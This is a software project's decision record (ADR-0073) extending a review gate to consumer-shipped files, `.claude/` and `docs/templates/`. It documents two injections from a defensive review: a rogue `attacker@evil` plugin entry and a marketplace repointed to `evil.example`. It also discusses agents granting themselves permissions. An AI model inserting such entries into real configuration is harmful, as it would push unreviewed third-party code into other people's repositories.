---
type: Decision
title: "ADR-0073: The review gate covers what CONSUMERS receive — all of .claude/ and docs/templates/ (amends ADR-0052)"
description: "ADR-0052 §1 enumerates implementation paths as .claude/commands/ and exempts docs/ wholesale. Both leave a shipped consumer artefact ungated: .claude/vfkb-guard.mjs is an executable consumers fetch verbatim, and docs/templates/consumer-settings.json is written into every onboarded repo. Decision: the gate follows delivery, not directory, and shipped templates are pinned by deep equality. Observed, not theorised — a rogue plugin, and later a repointed marketplace, each passed both the template Brake and the gate."
status: "Accepted"
timestamp: 2026-09-13
---

# ADR-0073: The review gate covers what CONSUMERS receive

- **Status:** Accepted (2026-09-13, maintainer ratification)
- **Date:** 2026-09-13
- **Amends:** [ADR-0052](ADR-0052-review-gate.md) §1 — replaces `.claude/commands/` with
  `.claude/`, and carves `docs/templates/` out of the blanket `docs/` exemption. ADR-0052's body
  is **not edited** ([ADR-0001](ADR-0001-record-decisions-as-adrs.md)); it gains only a
  status-pointer line. The gate's mechanism, verdict derivation and record schema are unchanged.
- **Relates:** [ADR-0059](ADR-0059-inactive-signal-guard.md) (the guard that was ungated),
  [ADR-0071](ADR-0071-consumer-wiring-hardening.md) (which decided consumers get the *template*,
  never vfkb's own settings), [ADR-0070](ADR-0070-guards-that-can-fail.md) (the review discipline
  that found this); issue #280; PR #279 (the near-miss).

## Context

ADR-0052 §1 enumerates implementation paths, and the enumeration was drawn along **directory**
lines. Two shipped artefacts fall outside it, and both are things consumers actually run:

**`.claude/vfkb-guard.mjs`** — an executable Node program, the ADR-0059 INACTIVE guard, and the
file `docs/CONSUMER-ONBOARDING.md:64` tells every consumer to fetch verbatim from this repo's
`main`. Only `.claude/commands/` was listed, so a PR changing the guard alone merged with no
review record. Not hypothetical: **PR #279 changed exactly that file**, and at its first head the
gate reported

```
1 implementation file(s) changed: test/vfkb-guard.test.ts
```

— the guard change the PR existed to make is absent from that list. It was reviewed only because
the PR happened also to touch `test/`.

**`docs/templates/consumer-settings.json`** — written verbatim into every onboarded consumer's
`.claude/settings.json` (`docs/CONSUMER-ONBOARDING.md:63`). ADR-0071 decided consumers must **not**
copy vfkb's own `.claude/settings.json`, so the template *is* the settings file they receive. It
sat under the blanket `docs/` exemption.

That second gap was demonstrated, not argued. During the ADR-0052 review of the fix for the first
gap, the reviewer added `"attacker@evil": true` to the template's `enabledPlugins` and changed
nothing else:

| check | result |
|---|---|
| `test/consumer-settings-template.test.ts` | **6/6 passed** |
| `scripts/review-gate.mjs` on a PR touching only that file | **green** |

The Brake pinned the three top-level keys and asserted the *expected* plugin key was present — it
never asserted that no **unexpected** key was. So a one-line PR could enable arbitrary third-party
software in every newly onboarded repo, unreviewed, with a green suite.

## Decision

1. **The gate follows delivery, not directory.** A path is an implementation path if a change to
   it reaches a consumer or changes what an agent executes — regardless of which tree it lives in.
2. **`IMPL_PATHS` covers all of `.claude/`**, not just `.claude/commands/`. Every tracked file
   there is implementation (the commands, the settings wiring, the guard); the sole local file,
   `settings.local.json`, is gitignored and can never appear in a diff.
3. **`docs/templates/` is implementation**, notwithstanding the `docs/` exemption. The rest of
   `docs/` stays exempt, and the selftest asserts that as a **pair** so the carve-out cannot pass
   for the wrong reason. **`docs/templates/` is hereby reserved for artefacts that ship verbatim to
   consumers** — an ADR or RFC boilerplate placed there would be pure documentation wrongly gated,
   so put those elsewhere. The directory rule fails closed, which is the safe direction, but the
   reservation is what keeps it honest as the tree grows.
4. **A template that enables software in other repos is pinned WHOLE, by deep equality.**
   Not "contains the expected key", and not even "has exactly these keys" — the review defeated
   the key-set form by repointing the marketplace to
   `{source:'git', url:'https://evil.example/x.git', repo:<the real repo, kept as a decoy>}`,
   which left every assertion satisfied. Key names were pinned; the values were free.
   `test/consumer-settings-template.test.ts` now deep-equals `enabledPlugins`,
   `extraKnownMarketplaces` and the `SessionStart` hook object. Replayed against the previous
   key-set form, **four injections that were green are now red** — swapped source object, dropped
   `source.source`, added `installHook`/`ref`, flipped hook `type`. Three others — rogue plugin,
   rogue marketplace, appended second hook — were already red and remain so.

## Consequences

**Positive.** The two artefacts a consumer actually receives are now both gated, and the gate's
stated rule matches its behaviour again. All nine commits touching `.claude/settings.json` are
substantive wiring changes, so the historical false-positive rate of this broadening is zero.

An earlier draft of this ADR said those commits "rode a larger **reviewed** PR", and the first
correction over-shot to "none carries a review record". Both were wrong; this is the executed
count. **Seven of the nine carry no review record at all. The two that do — `f2ca7564` and
`8feebde0` — are filed against pre-merge branch shas that squash-merging did not preserve, so
neither binding sha is an ancestor of the commit that carries its record.** The sharpest case is
the guard's own birth. `aadaca6` (#160, 2026-07-14) — the commit that ADDED
`.claude/vfkb-guard.mjs` — landed **four days after the gate itself** (`db8c06d`, 2026-07-10) and
touched only `.claude/settings.json`, `.claude/vfkb-guard.mjs` and `.vfkb/entries.jsonl`. Replaying
the gate as it existed at birth against exactly that file list classifies **none** of them as
implementation: review not required. The ADR-0059 guard entered `main` entirely unreviewed, and
nothing noticed for two months.

**Costs, stated rather than discovered later.**

- A permissions-only edit to `.claude/settings.json` now costs a review. Accepted deliberately: an
  agent widening its own permission allowlist is the same self-grant threat `reviews/OPERATORS` is
  gated for.
- `.claude/README.md` or `.claude/.gitkeep`, were either to appear, would be gated despite
  ADR-0052 §1 exempting `README.md` at the root. Failing closed is the safe direction; noted here
  so it is a known cost rather than a surprise.

**§1 IS BROADER THAN §2-§4 IMPLEMENT, and the gap is named rather than left to be discovered.**
Applied literally, "delivery, not directory" reaches two further paths this ADR does not gate:

- **`docs/CONSUMER-ONBOARDING.md`** — lines 63-64 are the `gh api` commands a consumer runs to
  fetch both artefacts. Editing `repos/vilosource/vfkb` to another owner there reaches a consumer
  exactly as surely as editing the template does. This ADR cites those two lines as the delivery
  mechanism while leaving the file containing them exempt.
- **`package.json`** — the npm delivery surface (`bin`, `files`, `prepack`, `scripts`), which hits
  both clauses of §1.

Both are left ungated **for now**, deliberately and on the record: widening again in the same
change would outrun the evidence, and neither has an observed defect the way the guard and the
template do. Naming them is the point — an unnamed gap is how `.claude/vfkb-guard.mjs` sat ungated
for two months.

**`CLAUDE.md` stays exempt, and this ADR does not claim to derive that.** §1's second clause
("changes what an agent executes") does not by itself separate `CLAUDE.md` from
`.claude/commands/*.md` — both are markdown an agent reads, and a draft of this ADR tried to split
them on "executed configuration versus read guidance", which fails: `.claude/commands/review.md` is
read guidance by that test and yet §2 gates it. So no principle is asserted here.
**`CLAUDE.md`'s exemption is an ADR-0052 §1 decision carried forward unchanged, not revisited.**
If a future ADR wants a derived line, *invocation* is the candidate worth testing — a named,
invocable procedure versus ambient context — but it is not decided here.

**Deliberately NOT decided here.** `.github/CODEOWNERS` — which decides who may approve — remains
ungated, while `reviews/OPERATORS`, its in-repo equivalent, is gated with the rationale *"otherwise
an agent could simply add itself."* The asymmetry is real and is recorded rather than fixed in
passing; it is outside the delivery-surface question this ADR settles.

**Negative.** The path list now has two entries that are not guessable from the directory tree.
That is inherent to a delivery-shaped rule, and is mitigated by `reviews/README.md` explaining both
in the place a contributor actually reads.

## Proof

Defect fix to an existing gate, so it rides the deterministic inner gate (ADR-0029's sub-task
exemption) rather than a new L4. The gate's own selftest is that inner gate.

- **The Brake can fail, observed not asserted.** Reverting `/^\.claude\//i` to
  `/^\.claude\/commands\//i` takes the selftest from **68/68** to red on exactly the two cases that
  should move, while the `.claude/commands/` regression control correctly stays green; deleting the
  `.claude` rule entirely reds all three, proving the control is connected.
- **The template assertion can fail**: the reviewer's `"attacker@evil"` probe, which was green
  before, now reds `enables NOTHING beyond vfkb`.
- **The gate gated its own PR.** `scripts/` is an implementation path, so the change refused itself
  until a review record existed — the behaviour being fixed, working on the change that fixed it.
